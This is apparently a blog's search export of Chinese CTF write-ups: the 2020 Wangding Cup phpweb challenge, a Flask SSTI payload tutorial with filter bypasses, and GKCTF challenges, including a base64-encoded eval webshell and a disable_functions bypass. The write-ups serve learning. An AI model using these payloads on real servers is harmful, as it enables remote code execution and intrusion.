<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020网鼎杯phpweb</title>
    <url>/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/</url>
    <content><![CDATA[<h1 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1.访问页面"></a>1.访问页面</h1><p>curl+u，可以查看到这些：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">id</span>=<span class="string">form1</span> <span class="attr">name</span>=<span class="string">form1</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">func</span> <span class="attr">name</span>=<span class="string">func</span> <span class="attr">value</span>=<span class="string">&#x27;date&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">p</span> <span class="attr">name</span>=<span class="string">p</span> <span class="attr">value</span>=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话我们推测它就是用了一个call_user_func的回调函数..</p>
<p>然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件，</p>
<p>于是构造：</p>
<p><img src="image-20201028192957104.png" alt="image-20201028192957104"></p>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确</p>
<h1 id="2-构造payload"><a href="#2-构造payload" class="headerlink" title="2.构造payload"></a>2.构造payload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;func != &quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo gettime($this-&gt;func, $this-&gt;p);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> (serialize($test));</span><br></pre></td></tr></table></figure>

<p>之后将这一段带入到题目当中，最终在tmp目录下找到</p>
<p><img src="image-20201028192936143.png" alt="image-20201028192936143"></p>
]]></content>
  </entry>
  <entry>
    <title>FlaskSSti</title>
    <url>/2020/10/27/FlaskSSti/</url>
    <content><![CDATA[<p>一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做</p>
<a id="more"></a>

<h1 id="1-hackbar-自带的payload如何构成的"><a href="#1-hackbar-自带的payload如何构成的" class="headerlink" title="1.hackbar 自带的payload如何构成的"></a>1.hackbar 自带的payload如何构成的</h1><p>第一件事情，就是搭建我们的环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
<p>通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>

<p>__class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>

<p>也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到：</p>
<p><strong>globals()</strong> 函数会以字典类型返回当前位置的全部全局变量,在交互模式下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>

<p>于是我们拼接得到如下的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>可以得到：</p>
<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
<p>我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0</p>
<p>执行如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象</p>
<p><strong>os.popen</strong> </p>
<p>　　该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。</p>
<p>　　output = os.popen(‘cat /proc/cpuinfo’)</p>
<p>　　print output.read()</p>
<p>于是我们构造最终的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-config以外的思路"><a href="#1-2-config以外的思路" class="headerlink" title="1.2 config以外的思路"></a>1.2 config以外的思路</h2><p>其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#得到str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<p>这时引入base和mro的魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__bases__ : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）</span><br><span class="line"></span><br><span class="line">__mro__ :类的父类，从父类网上找，最终会找到基类，所以mro[<span class="number">-1</span>]等价于__bases__</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
<p>这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#获取所有的子类方法</span></span><br></pre></td></tr></table></figure>

<p>之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有__builtins__，我们可以用这个去找eval：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>



<h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
<h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
<p>比如我们之前的payload修改成：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-过滤了中括号"><a href="#2-2-过滤了中括号" class="headerlink" title="2.2 过滤了中括号"></a>2.2 过滤了中括号</h2><p>这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>

<p>Python的魔法方法<code>__getitem__</code> 可以让对象实现迭代功能，这样就可以使用<code>for...in...</code> 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用request起步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-过滤了-号"><a href="#2-3-过滤了-号" class="headerlink" title="2.3 过滤了.号"></a>2.3 过滤了.号</h2><p>这个可以使用attr来进行绕过了，直接给出绕过方法：</p>
<p>所以之前的payload进行对比：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br><span class="line">    <span class="comment"># 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了</span></span><br></pre></td></tr></table></figure>

<p>不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路</p>
<h2 id="2-5利用request"><a href="#2-5利用request" class="headerlink" title="2.5利用request"></a>2.5利用request</h2><p>​    因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的</p>
<p>这里翻阅到了一个老外思路，但是他没给全。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>

<p>利用request的思路去重新把payload拼出来</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="2-4将中括号和-号都过滤情况下"><a href="#2-4将中括号和-号都过滤情况下" class="headerlink" title="2.4将中括号和.号都过滤情况下"></a>2.4将中括号和.号都过滤情况下</h2><p>当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制</p>
<p>我们可以先写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>之后为了绕过括号的限制，采用这种方法：</p>
<p>这里给出一个payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>

<h2 id="2-6-过滤了单引号和双引号的情况"><a href="#2-6-过滤了单引号和双引号的情况" class="headerlink" title="2.6 过滤了单引号和双引号的情况"></a>2.6 过滤了单引号和双引号的情况</h2><p>在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过</p>
<p>拼凑得：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>

<p>而实际上，我发现中括号也是可以进行替代的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>

<p>拼凑得出：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/10/27/GKCTF/</url>
    <content><![CDATA[<p>抽空把GKCTF的题目刷了，先从第一题开始说吧</p>
<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了</p>
<p>第一步访问就能审计到代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>

<p>密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。</p>
<p>但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>

<p>上传这里的gc漏洞，之后执行命令即可</p>
<h1 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h1><p>根据这篇文章可以做出来前半段成功拿到shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>

<p>这里我传入成功之后路径为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag</p>
<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>就是一个很基础的代码审计：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000</p>
<p>而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步</p>
